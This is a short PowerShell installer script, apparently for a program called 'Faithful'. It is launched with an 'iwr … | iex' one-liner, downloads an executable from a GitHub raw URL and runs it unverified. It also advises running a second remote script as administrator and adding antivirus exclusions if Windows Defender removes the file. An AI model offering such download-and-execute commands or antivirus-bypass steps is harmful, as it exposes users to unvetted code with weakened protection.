# Command to execute:
# iwr faithful.cf | iex

cd $env:userprofile
Write-Output "[LAST UPDATE]: 23/4/2022 6:10 PM"
Write-Output "(INFO) Downloading executable file..."
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "XFaithful.exe"
Write-Output "(INFO) Running executable..."
Start-Process ("XFaithful.exe")
Write-Output "(INFO) Done!"
Write-Output "If Windows Defender automatically removes the Faithful executable, run 'iwr a.faithful.cf | iex' as an administrator instead."
Write-Output "If you are using any other antivirus and face issues with them, add exclusions for the paths stated in the above command manually."
